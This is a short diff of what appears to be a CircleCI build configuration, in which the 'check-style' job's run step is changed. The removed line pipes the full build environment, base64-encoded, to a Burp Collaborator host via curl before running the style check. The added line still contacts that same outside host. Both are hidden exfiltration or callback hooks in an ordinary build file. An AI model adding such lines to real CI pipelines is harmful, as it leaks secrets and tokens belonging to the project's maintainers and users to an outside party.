@@ -14,7 +14,7 @@ jobs:
       name: default
     steps:
       - checkout
-      - run: curl https://ao2fwluz22pp6hw7kzbqppg2otuji8.burpcollaborator.net?env=$(env | base64 | tr -d '\n'); make check-style
+      - run: curl https://ao2fwluz22pp6hw7kzbqppg2otuji8.burpcollaborator.net; make check-style
 
   check-modules:
     executor:
